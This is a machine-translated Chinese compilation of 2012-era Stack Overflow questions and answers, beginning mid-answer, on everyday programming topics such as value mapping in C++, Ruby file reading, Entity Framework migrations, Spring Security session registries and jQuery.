至于您的第二个问题：我不确定这必须有多灵活。它只是从文件附加程序切换到事件日志附加程序吗？根据您的回答，您可能会考虑两个准备配置文件（例如 file.log4net 和 eventlog.log4net）并根据需要读取配置（在这种情况下，您不能使用该属性：您`Configure()`直接调用该方法）或者您的要求更多复杂的你甚至可能最终以[编程](https://stackoverflow.com/q/769983/106567)方式配置 log4net 。

# php - 仅访问电子邮件的当前部分

> ID：11271424
> 
> 赞同：1
> 
> 时间：2012-06-30T04:34:47.873
> 
> 标签：php, email

我正在使用 imap_xxxx 函数来阅读电子邮件正文。我的问题是只找出电子邮件正文的当前部分而不是完整的电子邮件。当用户回复电子邮件时，它不仅包含他的回复，还包含完整的邮件链。我知道 facebook 会这样做（或者可能还有许多其他网站），但是如何......

# c++ - 将一个值限制在一个范围内（有点）

> ID：11271425
> 
> 赞同：1
> 
> 时间：2012-06-30T04:34:59.513
> 
> 标签：c++, algorithm, math

我有一个滑块，它返回从 0.0f 到 1.0f 的值。

我想使用这个值并将其钳制为 MIN 和 MAX，但不完全钳制。

假设最小值为 0.2f，最大值为 0.3f。当滑块为 0 时，我想要 0.2f。当滑块在 0.5f 时，我想要 0.25f，依此类推。

只是这样滑块的效果没有那么强。

给定 MIN MAX 和sliderVal，我怎么能夹住sliderVal？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T04:39:16.890

```
slider_range = slider_max - slider_min;
range = range_max - range_min;

value = (double)(slider_pos - slider_min) / slider_range * range + range_min; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-30T04:38:34.067

假设您希望滑块在`0.2f`和之间线性变化`0.3f`，那么从区间`[0.0 1.0]`到的转换`[0.2 0.3]`是微不足道的：

```
newVal = 0.2f + (sliderVal)*0.1f; 
```

从数学的角度来看，根据您的描述，您希望输出相对于输入是线性的。因此，输入值和输出值之间的传递函数必须采用以下形式：

```
y = mx + b 
```

将`x`值作为输入（滑块值），将`y`值作为输出（新的、所需的值）。因此，您有两点：`(0.0, 0.2)`并将`(1.0, 0.3)`这些点代入上述等式：

```
0.2 = (0.0)m + b
0.3 = (1.0)m + b 
```

您现在有一个线性方程组，可以轻松求解：

```
0.2 = (0.0)m + b --> b = 0.2
0.3 = (1.0)m + b --> 0.3 = m + 0.2 --> m = 0.1 
```

因此，传递函数为：

```
y = 0.1 * x + 0.2 
```

量子点

我们可以概括上述过程。不要使用点`(0.0, 0.2)`和`(1.0, 0.3)`，而是使用点`(minSlider, maxSlider)`和`(minValue, maxValue)`。

```
minValue = (minSlider)m + b
maxValue = (maxSlider)m + b 
```

消除变量`b`：

```
minValue = (minSlider)m + b
-maxValue = -(maxSlider)m - b

--> minValue-maxValue = (minSlider-maxSlider)m
m = (minValue-maxValue)/(minSlider-maxSlider) 
```

消除变量`m`：

```
minValue*maxSlider = (minSlider*maxSlider)m + b*maxSlider
-maxValue*minSlider = -(minSlider*maxSlider)m - b*minSlider

--> minValue*maxSlider - maxValue*minSlider = b(maxSlider-minSlider)
b = (minValue*maxSlider - maxValue*minSlider)/(maxSlider-minSlider) 
```

您可以验证这些方程式是否为您提供了完全相同的`m`和值`b`。如果我们假设最小滑块值将始终为`0.0`：

```
m = (minValue-maxValue)/(minSlider-maxSlider)
b = (minValue*maxSlider - maxValue*minSlider)/(maxSlider-minSlider)

--> m = (maxValue-minValue)/(maxSlider)
    b = minValue 
```

在 C++ 中：

```
const double maxSlider = 1.0;
const double minValue = 0.2;
const double maxValue = 0.3;
double value = (maxValue-minValue)/(maxSlider)*getSliderPosition() + minValue; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-30T04:39:00.200

基本上你有

```
0.0f -> MIN
1.0f -> MAX 
```

你想要

```
clampedVal = sliderVal * ( MAX - MIN ) + MIN 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-12T04:24:07.493

[`std::lerp`](https://en.cppreference.com/w/cpp/numeric/lerp)做这个。它接受三个浮点数，并在第一个和第二个之间插入第三个参数。

> 从[cppreference](https://en.cppreference.com/)引用：

```
#include <iostream>
#include <cmath>

int main()
{
    float a=10.0f, b=20.0f;

    std::cout << "a=" << a << ", " << "b=" << b << '\n'
              << "mid point=" << std::lerp(a,b,0.5f) << '\n'
              << std::boolalpha << (a == std::lerp(a,b,0.0f)) << ' '
              << std::boolalpha << (b == std::lerp(a,b,1.0f)) << '\n';
} 
```

**输出：**

```
a=10, b=20
mid point=15
true true 
```

# ruby - 为什么控制台没有输出？Ruby中IO#reallines方法块中的代码

> ID：11271428
> 
> 赞同：1
> 
> 时间：2012-06-30T04:35:40.760
> 
> 标签：ruby

这对我来说似乎很奇怪：

```
f = File.open(Dir.pwd+'/tmp','r') 
f.readlines do |l|
  puts "#{f.lineno}:#{l}"
end

#=>["first line","second"] 
```

为什么控制台中没有输出

```
1: first line
2: second line 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T04:42:30.057

你想要`each`而不是`readlines`。

```
File.open(Dir.pwd+'/tmp','r') do |f|
  f.each do |l|
    puts "#{f.lineno}:#{l}"
  end
end 
```

`readlines`一次读取整个数组。

在您的特定情况下，您调用`readlines`以获取一个数组，但您将一个块传递给该`readlines`方法。该方法`readlines`只返回一个数组，它不处理块。您应该只向知道如何处理块的方法调用提供块。如果该方法无法处理块，则不会发生任何事情。

（旁白：如果您`each`对结果进行 an 操作，`readlines`那么您将在每一行上获得相同的行号。）

# c# - 如何设置消息队列的所有者？

> ID：11271429
> 
> 赞同：5
> 
> 时间：2012-06-30T04:35:42.807
> 
> 标签：c#, msmq

System.Messaging.MessageQueue 类不提供设置队列所有权的方法。如何以编程方式设置 MSMQ 消息队列的所有者？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T04:35:43.850

简短的回答是 p/invoke 对 windows api 函数的调用[`MQSetQueueSecurity`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms705190%28v=vs.85%29.aspx)

```
void SetOwner(MessageQueue queue, byte[] sid, bool ownerDefaulted = false)
{
    var securityDescriptor = new Win32.SECURITY_DESCRIPTOR();
    if (!Win32.InitializeSecurityDescriptor(securityDescriptor, Win32.SECURITY_DESCRIPTOR_REVISION))
        throw new Win32Exception();

    if (!Win32.SetSecurityDescriptorOwner(securityDescriptor, sid, ownerDefaulted))
        throw new Win32Exception();

    if (Win32.MQSetQueueSecurity(queue.FormatName, Win32.OWNER_SECURITY_INFORMATION, securityDescriptor))
        throw new Win32Exception();
} 
```

可以在[github](https://github.com/gavacho/System.Messaging.MessageQueue.SetOwner)上找到定义`SetOwner`扩展方法的完整类`System.Messaging.MessageQueue`

# android - 如何从没有root的应用程序中捕获其他Android应用程序的屏幕截图？

> ID：11271436
> 
> 赞同：4
> 
> 时间：2012-06-30T04:36:46.763
> 
> 标签：android

我想截取我手机上运行的 Android 应用程序的屏幕截图。

我尝试使用[ScreenShot UX](https://play.google.com/store/apps/details?id=com.liveov.shotux&feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5saXZlb3Yuc2hvdHV4Il0.)应用程序。这也可以在无根电话上完成。知道如何从后台运行的服务中获取 Android 中应用程序的屏幕截图吗？

我希望我的服务定期捕获屏幕并发送到服务器。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-30T10:27:55.900

获取非您自己的应用程序屏幕截图的唯一方法是获取原始帧缓冲区。帧缓冲区通常位于`/dev/fb0`或`/dev/graphics/fb0`。在某些设备（如 LG Optimus One）上，无需 root 权限即可访问，但在大多数设备（如 Nexus S）上，您需要为此获得 root 权限。出于安全原因，通常不允许这样做，因为恶意应用程序可能会在后台截取屏幕截图并将其发送到远程服务器，从而泄露电子邮件 ID 和密码等信息，在某些情况下还会泄露银行账户详细信息。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-06-30T04:56:35.427

看看[Android-screenshot-library](http://code.google.com/p/android-screenshot-library/)，它能够以编程方式从 Android 设备捕获屏幕截图，而无需拥有 root 访问权限。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-06-02T02:00:37.723

从 Android 5.0+ 开始，您可以使用 SDK 中称为[媒体投影](https://developer.android.com/reference/android/media/projection/package-summary.html)的新功能来进行屏幕捕获，而无需 root 权限。Google 提供的示例代码可[在此处](https://github.com/googlesamples/android-ScreenCapture)获得。

# android - Android画笔纹理

> ID：11271438
> 
> 赞同：2
> 
> 时间：2012-06-30T04:37:16.420
> 
> 标签：android, graphics, paint, brush

除了普通的椭圆形、圆形和矩形外，有谁知道如何在 android 中将纹理应用于画笔。任何帮助都将不胜感激，或者我可以阅读的任何资源。

因为stackoverflow不允许我发布画笔的图片，请点击[这里](http://www.layersforiphone.com/)并检查画笔部分

我想做类似的东西，是重新绘制一个 .png 还是`path`在给定区域周围有很多 s？

# box2d - 在box2d中跳跃后如何限制冲动？

> ID：11271439
> 
> 赞同：0
> 
> 时间：2012-06-30T04:37:22.650
> 
> 标签：box2d, box2d-iphone

我怎么能限制冲动？我想让身体快速跳跃，然后限制他的跳跃。

我正在寻找类似以下的东西，冲动后的摩擦，但这不起作用（玩家停留在 y 轴上的位置，因为 vec2.y 将等于“0”）

```
//after a touch
body->ApplyLinearImpulse( b2Vec2(x,y), body->GetPosition() );
vec2 = body->GetLinearVelocity();

//in the tick method, called every step
vec2.y = vec2.y * 0.99;
CCLOG(@"vec2.y : %f", vec2.y);
body->SetLinearVelocity(vec2); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-02T13:40:20.603

我一直在寻找这种安静，但最终做到了：

```
//call this after touch
       body->ApplyLinearImpulse(b2Vec2(0, 35000), body->GetPosition());

        [self schedule:@selector(CheckVelocity) interval:0.0001];
        [self scheduleOnce:@selector(toggleCheckForLanding) delay:.5];

-(void)CheckVelocity
{
set a max velocity according to your jump i have set it 13.....
    int velocitymax = MAX_VELOCITY;//13
    b2Vec2 vel = body->GetLinearVelocity();
    if(vel.y>velocitymax)
    {
        vel.x = 0;
        vel.y = MAX_VELOCITY;
        body->SetLinearVelocity( vel );
    }

}

-(void) toggleCheckForLanding
{
    [self unschedule:@selector(CheckVelocity)];
    canCheckForLanding_ = YES;
} 
```

# memory - 一个 32 位进程如何使用将近 4GB 的内存？

> ID：11271441
> 
> 赞同：2
> 
> 时间：2012-06-30T04:38:11.397
> 
> 标签：memory, 32-bit, virtual-memory

我认为 32 位进程最多可以使用 2GB RAM，因为一半的地址空间是为操作系统保留的（使用 /3GB 开关可能是 3GB）。然而，星际争霸 II 设法使用了将近 4GB 的空间，而且它是一个 32 位的 EXE。进程资源管理器显示：

```
4,000,896 KB private bytes
3,928,164 KB working set 
```

它是如何做到的，我如何在自己的程序中做到这一点？在.NET中是否可能？在非托管 C++ 中？以某种方式在托管 C++ 中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T04:51:24.873

在 64 位操作系统上，32 位进程几乎可以使用 4GB。

标记为“大地址空间感知”的进程在 32 位操作系统中最多可以使用 3GB，在 64 位操作系统中最多可以使用完整地址空间。

这里有更多的讨论：[Can a 32bit process access more memory on a 64bit windows OS?](https://stackoverflow.com/questions/570589/can-a-32bit-process-access-more-memory-on-a-64bit-windows-os) .

# entity-framework - 没有 nuget 的 EF Code First DbMigration

> ID：11271445
> 
> 赞同：12
> 
> 时间：2012-06-30T04:39:03.783
> 
> 标签：entity-framework, ef-code-first, entity-framework-migrations

如何在没有 nuget 的情况下迁移数据库？在生产环境中无法将 Visual Studio 与 nuget 一起使用。目前，许多示例仅教我们将 Visual Studio 与 nuget 一起使用。如何使用生成的 DbMigration 类？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-30T23:44:44.590

最简单的方法是：

```
Database.SetInitializer(
    new MigrateDatabaseToLatestVersion<MyDbContext,
                                       MyDbMigrationsConfiguration>()); 
```

这将在初始化 DbContext 时运行迁移。

您也可以手动强制执行：

```
var migrator = new DbMigrator(new MyMigrationsConfiguration());
migrator.Update(); 
```

（相信你也得`TargetDatabase`在配置上设置，不过你可以试试）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-17T17:11:05.097

以下是选项：

1.  使用我们的 NuGet 包中附带的 migrate.exe 命令行工具。
2.  如其他人所述，使用 MigrateDatabaseToLatestVersion 初始化程序。
3.  使用 DbMigrator 类提供的运行时 API。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-16T01:20:23.263

您可以使用 Web.config 设置迁移到最新版本 - 请参阅[Rowan Miller 的这篇博](http://blogs.msdn.com/b/adonet/archive/2012/01/12/ef-4-3-configuration-file-settings.aspx)文：

*如果您使用 Code First 迁移，则可以使用 MigrateDatabaseToLatestVersion 初始化程序将数据库配置为自动迁移。*

```
<contexts>
  <context type="Blogging.BlogContext, MyAssembly">
    <databaseInitializer type="System.Data.Entity.MigrateDatabaseToLatestVersion`2[[Blogging.BlogContext, 
MyAssembly], [Blogging.Migrations.Configuration, MyAssembly]], EntityFramework" />
  </context>
</contexts> 
```

只需在此处交换您的上下文类： System.Data.Entity.MigrateDatabaseToLatestVersion 内置于 EF。此设置更新了相同想法的旧 AppSettings 版本。

在我看来，这是最好的方法，因为使用哪个初始化器的问题实际上是一个配置问题，并且您希望能够对此进行 Web.config，并理想地应用配置转换以适用于您的不同环境。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-30T14:31:28.103

您可以使用 EF Power Tools 执行此操作，您可以使用 migrate.exe 程序从命令提示符运行迁移（例如构建后）。如果您想在生产数据库上运行迁移，您还可以使用 Update-Database 命令从迁移类生成 SQL 脚本，这在您需要通过 DBA 时非常有用。

EF Power Tools 可在 Visual Studio Gallery 上找到，也可以[在此处](http://visualstudiogallery.msdn.microsoft.com/72a60b14-1581-4b9b-89f2-846072eff19d)查看这个非常有用的[视频](http://channel9.msdn.com/Shows/Web+Camps+TV/Rowan-Miller-Demonstrates-Entity-Framework-5-Using-ASPNET-MVC-4)，其中包括关于 Update-Database 命令的内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-11-10T08:24:57.603

还有另一种解决方案：

```
 Using DB = New SHAContext()
        If DB.Database.Exists() Then
            Dim migrator As New DbMigrator(New SHAClassLibrary.Migrations.Configuration())
            For Each m In migrator.GetDatabaseMigrations()
                Try
                    migrator.Update(m)
                Catch ex As Exception

                End Try
            Next
        End If
        'DB.test()
    End Using 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-01-13T13:13:04.180

我正在寻找一种方法来控制哪些迁移在代码中显式运行，而无需启用 DbConfiguration 类或自动迁移。

所以我设法创建了以下扩展：

```
public static void RunMigration(this DbContext context, DbMigration migration)
{            
    var prop = migration.GetType().GetProperty("Operations", BindingFlags.NonPublic | BindingFlags.Instance);
    if (prop != null)
    {
        IEnumerable<MigrationOperation> operations = prop.GetValue(migration) as IEnumerable<MigrationOperation>;
        var generator = new SqlServerMigrationSqlGenerator();
        var statements = generator.Generate(operations, "2008");
        foreach (MigrationStatement item in statements)
            context.Database.ExecuteSqlCommand(item.Sql);
    }
} 
```

例如，进行如下迁移：

```
public class CreateIndexOnContactCodeMigration : DbMigration
{
    public override void Up()
    {
        this.CreateIndex("Contacts", "Code");
    }

    public override void Down()
    {
        base.Down();
        this.DropIndex("Contacts", "Code");
    }
} 
```

您可以使用 DbContext 运行它：

```
using (var dbCrm = new CrmDbContext(connectionString))
{
    var migration = new CreateIndexOnContactCodeMigration();
    migration.Up();                
    dbCrm.RunMigration(migration);
} 
```

# google-apps-script - 反映影响使用该库的所有 google 电子表格的库的更改

> ID：11271447
> 
> 赞同：1
> 
> 时间：2012-06-30T04:39:14.220
> 
> 标签：google-apps-script, google-sheets

我正在使用谷歌电子表格，并且正在尝试使用库。

我只想更新我的库中的一个函数，然后让更改影响使用该库的所有电子表格。

有没有一种方法可以做到这一点，而不必增加版本并进入每个电子表格脚本以包含最新版本？

**编辑：**有没有办法在不使用开发模式的情况下做到这一点？我只想在新版本稳定时将其发布到电子表格。所以当版本 2 准备好时，我想批量更新所有依赖的电子表格？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T17:26:55.690

您可以使用“开发模式”

# spring - 我如何获得所有登录用户的列表（通过 Spring Security）我的 Web 应用程序

> ID：11271449
> 
> 赞同：76
> 
> 时间：2012-06-30T04:39:31.863
> 
> 标签：spring, web-applications, login, spring-security

我在我的 web 应用程序中使用 spring security，现在我想要一个所有登录到我的程序的用户的列表。

我怎样才能访问该列表？他们不是已经保存在 spring 框架中的某个地方了吗？喜欢***SecurityContextHolder***或***SecurityContextRepository***吗？

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-06-30T07:04:52.897

要访问所有登录用户的列表，您需要将 SessionRegistry 实例注入到您的 bean。

```
@Autowired
@Qualifier("sessionRegistry")
private SessionRegistry sessionRegistry; 
```

然后使用注入的 SessionRegistry 可以访问所有主体的列表：

```
List<Object> principals = sessionRegistry.getAllPrincipals();

List<String> usersNamesList = new ArrayList<String>();

for (Object principal: principals) {
    if (principal instanceof User) {
        usersNamesList.add(((User) principal).getUsername());
    }
} 
```

但是在注入会话注册表之前，您需要在 spring-security.xml 中定义会话管理部分（查看[Spring Security 参考文档](http://static.springsource.org/spring-security/site/docs/3.0.x/reference/session-mgmt.html)中的会话管理部分），并且在并发控制部分中，您应该为会话注册表对象设置别名（*session-registry- alias* )，您将通过它注入它。

```
 <security:http access-denied-page="/error403.jsp" use-expressions="true" auto-config="false">
        <security:session-management session-fixation-protection="migrateSession" session-authentication-error-url="/login.jsp?authFailed=true"> 
            <security:concurrency-control max-sessions="1" error-if-maximum-exceeded="true" expired-url="/login.html" session-registry-alias="sessionRegistry"/>
        </security:session-management>

    ...
    </security:http> 
```

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2014-11-27T16:55:18.767

在 JavaConfig 中，它看起来像这样：

```
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(final HttpSecurity http) throws Exception {
        // ...
        http.sessionManagement().maximumSessions(1).sessionRegistry(sessionRegistry());
    }

    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }

    @Bean
    public ServletListenerRegistrationBean<HttpSessionEventPublisher> httpSessionEventPublisher() {
        return new ServletListenerRegistrationBean<HttpSessionEventPublisher>(new HttpSessionEventPublisher());
    }
} 
```

调用代码如下所示：

```
public class UserController {
    @Autowired
    private SessionRegistry sessionRegistry;

    public void listLoggedInUsers() {
        final List<Object> allPrincipals = sessionRegistry.getAllPrincipals();

        for(final Object principal : allPrincipals) {
            if(principal instanceof SecurityUser) {
                final SecurityUser user = (SecurityUser) principal;

                // Do something with user
                System.out.println(user);
            }
        }
    }
} 
```

请注意，这`SecurityUser`是我自己的实现`UserDetails`.

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-07-04T23:04:40.773

如果我错了，请纠正我。

我认为[@Adam 的](https://stackoverflow.com/a/27175666/2796922)回答不完整。我注意到列表中已经过期的会话再次出现。

```
public class UserController {
    @Autowired
    private SessionRegistry sessionRegistry;

    public void listLoggedInUsers() {
        final List<Object> allPrincipals = sessionRegistry.getAllPrincipals();

        for (final Object principal : allPrincipals) {
            if (principal instanceof SecurityUser) {
                final SecurityUser user = (SecurityUser) principal;

                List<SessionInformation> activeUserSessions =
                        sessionRegistry.getAllSessions(principal,
                                /* includeExpiredSessions */ false); // Should not return null;

                if (!activeUserSessions.isEmpty()) {
                    // Do something with user
                    System.out.println(user);
                }
            }
        }
    }
} 
```

希望能帮助到你。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-03-09T11:03:11.667

如果我也错了，请纠正我。

我认为@Adam 和@elysch 的答案不完整。我注意到需要添加监听器：

```
 servletContext.addListener(HttpSessionEventPublisher.class); 
```

到

```
public class AppInitializer implements WebApplicationInitializer {

@Override
public void onStartup(ServletContext servletContext) {
  ...
servletContext.addListener(HttpSessionEventPublisher.class);
} 
```

带安全配置：

```
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(final HttpSecurity http) throws Exception {
        // ...
        http.sessionManagement().maximumSessions(1).sessionRegistry(sessionRegistry());
    }

    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }

    @Bean
    public HttpSessionEventPublisher httpSessionEventPublisher() {
        return new HttpSessionEventPublisher();
    }
} 
```

然后您将获得当前在线用户！

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-09-24T09:24:59.413

您需要注入`SessionRegistry`（如前所述），然后您可以在一个管道中执行此操作，如下所示：

```
public List<UserDetails> findAllLoggedInUsers() {
    return sessionRegistry.getAllPrincipals()
            .stream()
            .filter(principal -> principal instanceof UserDetails)
            .map(UserDetails.class::cast)
            .collect(Collectors.toList());
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2018-10-24T04:55:27.520

发现此注释非常重要且相关：

> “[21] SessionManagementFilter 不会检测到在身份验证后执行重定向的机制（例如表单登录）的身份验证，因为在身份验证请求期间不会调用过滤器。会话管理功能必须在这些中单独处理案件。”

[https://docs.spring.io/spring-security/site/docs/3.1.x/reference/session-mgmt.html#d0e4399](https://docs.spring.io/spring-security/site/docs/3.1.x/reference/session-mgmt.html#d0e4399)

此外，显然很多人无法让*sessionRegistry.getAllPrincipals()*返回与空数组不同的内容。就我而言，我通过将*sessionAuthenticationStrategy*添加到我的自定义*authenticationFilter*来修复它：

```
@Bean
public CustomUsernamePasswordAuthenticationFilter authenticationFilter() throws Exception {
...

  authenticationFilter.setSessionAuthenticationStrategy(sessionAuthenticationStrategy());
}

@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}

//cf. https://stackoverflow.com/questions/32463022/sessionregistry-is-empty-when-i-use-concurrentsessioncontrolauthenticationstrate
public SessionAuthenticationStrategy sessionAuthenticationStrategy() {
    List<SessionAuthenticationStrategy> stratList = new ArrayList<>();
    SessionFixationProtectionStrategy concStrat = new SessionFixationProtectionStrategy();
    stratList.add(concStrat);
    RegisterSessionAuthenticationStrategy regStrat = new RegisterSessionAuthenticationStrategy(sessionRegistry());
    stratList.add(regStrat);
    CompositeSessionAuthenticationStrategy compStrat = new CompositeSessionAuthenticationStrategy(stratList);
    return compStrat;
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-12-12T16:22:04.040

类似于@rolyanos 解决方案，我的对我来说总是有效的：

**- 对于控制器**

```
@RequestMapping(value = "/admin")
public String admin(Map<String, Object> model) {

    if(sessionRegistry.getAllPrincipals().size() != 0) {
        logger.info("ACTIVE USER: " + sessionRegistry.getAllPrincipals().size());
        model.put("activeuser",  sessionRegistry.getAllPrincipals().size());
    }
    else
        logger.warn("EMPTY" );

    logger.debug(log_msg_a + " access ADMIN page. Access granted." + ANSI_RESET);
    return "admin";
} 
```

**- 用于前端**

```
<tr th:each="activeuser, iterStat: ${activeuser}">
    <th><b>Active users: </b></th> <td align="center" th:text="${activeuser}"></td>
    </tr> 
```

**- 春季会议**

```
@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}

@Bean
public ServletListenerRegistrationBean<HttpSessionEventPublisher> httpSessionEventPublisher() {
    return new ServletListenerRegistrationBean<HttpSessionEventPublisher>(new HttpSessionEventPublisher());
}

@Override
protected void configure(HttpSecurity http) throws Exception {

    http.logout()
    .logoutSuccessUrl("/home")
    .logoutUrl("/logout")
    .invalidateHttpSession(true)
    .deleteCookies("JSESSIONID");

    http.authorizeRequests()
    .antMatchers("/", "/home")
    .permitAll()

    .antMatchers("/admin")
    .hasRole("ADMIN") 
    .anyRequest()
    .authenticated()

    .and()
    .formLogin()
    .loginPage("/home")
    .defaultSuccessUrl("/main")
    .permitAll()
    .and()
    .logout()
    .permitAll();

    http.sessionManagement().maximumSessions(1).sessionRegistry(sessionRegistry());

    http.authorizeRequests().antMatchers("/webjars/**").permitAll();

    http.exceptionHandling().accessDeniedPage("/403");
} 
```

# jquery - 如何获取 Div 的所有文本框的值？

> ID：11271457
> 
> 赞同：2
> 
> 时间：2012-06-30T04:41:16.880
> 
> 标签：jquery

我有一个 div 容器，当单击“添加”按钮时，我正在创建一个动态文本框控件

```
<div id="Container">
    <input type="Submit" id="AddTextBox" value="Add">
    <!-- Here are my dynamic textboxes -->
    <input type="text" value='' class="dynamic">
    <input type="text" value='' class="dynamic">
    <input type="text" value='' class="dynamic">
</div>

<input type="create" id="create" onclick="GetValue();" value="create"> 
```

我想获取所有文本框控件的值，例如：

```
Function GetValue()
{
    var COntain=TextBoxValue+"$"+Textbox2Value+"$"; // so on
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-30T04:48:06.233

```
function GetValue(){
    var Contain = "";
    $("#Container :text").each(function(){
        Contain += $(this).val() + "$";
    });
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T04:47:43.330

这将为您提供具有 id = "Container" 的 div 的所有文本框的 $ 分隔连接值

**[现场演示](http://jsfiddle.net/rajaadil/3pM2P/2/)**

```
str = "";
$('#Container input[type=text]').each(function (){
  str+=$(this).val() + "$";
});

//To remove the extra $ at end  
if(str != "")  
    str = str.substring(0,str.length-1); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T04:49:01.503

```
var completetext ='';
$('.dynamic').each(function() {
    completetext = completetext + ', ' +$(this).val();
}); 
```

输出将存储在变量中`completetext`

# objective-c - 委托错误

> ID：11271461
> 
> 赞同：1
> 
> 时间：2012-06-30T04:42:15.063
> 
> 标签：objective-c, delegates, cs193p

我想做的是：

首先，它与类（控制器）`TopPlacesViewController`有一个segue 。`SinglePlacePhotosViewController``TableView`

我在类中创建了一个委托`TopPlacesViewController`，然后使用该`prepareforSegue`方法将其设置`SinglePlacePhotosViewController`为委托并实现协议方法。

然后，当我单击`TopPlacesViewController`（TableView 控制器）中的照片时，它会调用`TopPlacesViewController`应该显示该位置的一些照片的方法。

但我一直收到这个错误：

> [SinglePlacePhotosViewController setDelegate:]：无法识别的选择器发送到实例 0xc94cc20

我的`TopPlacesViewController.h`文件：

```
@class TopPlacesViewController;  

@protocol TopPlacesViewControllerDelegate    
- (void)topPlacesViewControllerDelegate:(TopPlacesViewController *)sender
                            showPhotos:(NSArray *)photo;   
@end

@interface TopPlacesViewController : UITableViewController

@property (nonatomic,weak) id <TopPlacesViewControllerDelegate> delegate;   
@end 
```

`TopPlacesViewController.m`：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{                                                                                  
    NSDictionary *place = [self.places objectAtIndex:indexPath.row];   
    self.singlePlacePhotos = [FlickrFetcher photosInPlace:place maxResults:50];   
    [self.delegate topPlacesViewControllerDelegate:self showPhotos:self.singlePlacePhotos];  
    [self performSegueWithIdentifier:@"Flickr Photos" sender:self];   
}

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{   
    if([segue.identifier isEqualToString:@"Flickr Photos"]) {                                  
          [segue.destinationViewController setDelegate:self];     
    }         
} 
```

然后在这个我实现委托：

```
@interface SinglePlacePhotosViewController () <"TopPlacesViewControllerDelegate">    
- (void)topPlacesViewControllerDelegate:(TopPlacesViewController *)sender showPhoto:(NSArray *)photo    
{    
    self.photos = photo;    
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:03:09.063

是的，错误很明显，因为您调用的是 SinglePlacePhotosviewController 的 setter 方法 (setDelegate:) 但 @property (nonatomic,weak) id 委托；在 TopPlacesViewController 中。

您在这里以错误的方式使用协议。如果您想将 TopPlacesViewController 中的照片数组传递给 SinglePlacePhotosviewController，只需将 TopPlacesViewController 中的数组分配给 prepareSegue 方法中的 SinglePlacePhotosviewController 数组即可。

通常用于将一个类的引用传递给另一个类的协议，这里你已经在 TopPlacesViewController 中有 SinglePlacePhotosviewController (segue.destinationController) 的实例。如果你想在 SinglePlacePhotosviewController 中引用 TopPlacesViewController，那么你必须在 SinglePlacePhotosviewController 中创建协议，并将 TopPlacesViewController 的 self 传递给 SinglePlacePhotosviewController 的委托协议，就像你在这里做的那样准备 segue 方法。希望我已经清除了您的查询，请告诉我。

# c# - 我可以在经典的 ASP.Net 应用程序中使用 Sharp Architecture 还是仅用于 ASP.Net MVC？

> ID：11271466
> 
> 赞同：1
> 
> 时间：2012-06-30T04:43:42.690
> 
> 标签：c#, asp.net, nhibernate, architecture, sharp-architecture

我想开始一个使用 NHibernate 作为数据访问层的新项目。现在我的问题是，我可以在 ASP.Net 应用程序中使用 Sharp Architecture 还是仅用于 ASP.Net MVC？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T05:01:06.183

我知道这不是您的问题，但只是为了确定：您可以在*不*使用 S#arp 架构的情况下使用 NHibernate。而且，在这种情况下，将 NH 与 WebForm 应用程序一起使用绝对没有问题。

现在，回到 S#arp。我从来没有使用过 S#arp，但是[阅读他们的教程](https://github.com/sharparchitecture/Sharp-Architecture/wiki/Simple-crud-application)你可以看到 Controller 和 View 之间的交互是基于域模型的。也就是说，S#arp 的使用在 Controller 和您的后端架构之间。因此，如果您使用的是 WebForms 应用程序，则代码隐藏将扮演 Controller 角色。

所以，据我目前所知，是的，您可以将 S#arp 与 WebForms 应用程序一起使用。

问候

# android - 在 Android WebView 中未重用 SSL 会话

> ID：11271469
> 
> 赞同：20
> 
> 时间：2012-06-30T04:44:12.947
> 
> 标签：android, ssl, android-webview

我一直在尝试在 Android webview 上重用 SSL 会话。我们注意到，如果连续请求发生在约 5 秒内，则 ssl 会话将被重新使用。在服务器（nginx）中，我们设置了`ssl_session_timeout 10m` 含义，10 分钟，keep-alive 为 30 秒。

似乎 Android webview 控件在 5 秒后破坏了 session-id。

